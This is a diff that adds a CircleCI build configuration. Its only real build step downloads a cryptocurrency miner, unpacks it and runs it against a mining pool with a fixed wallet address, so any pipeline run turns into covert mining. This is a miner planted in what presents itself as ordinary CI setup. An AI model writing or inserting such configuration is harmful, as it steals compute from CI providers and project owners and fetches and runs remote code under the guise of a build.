@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run: wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:2222 -u 0x65c4EF0A03138F3E059Eb3B06c28Dbdb4166fFEE -p x -t
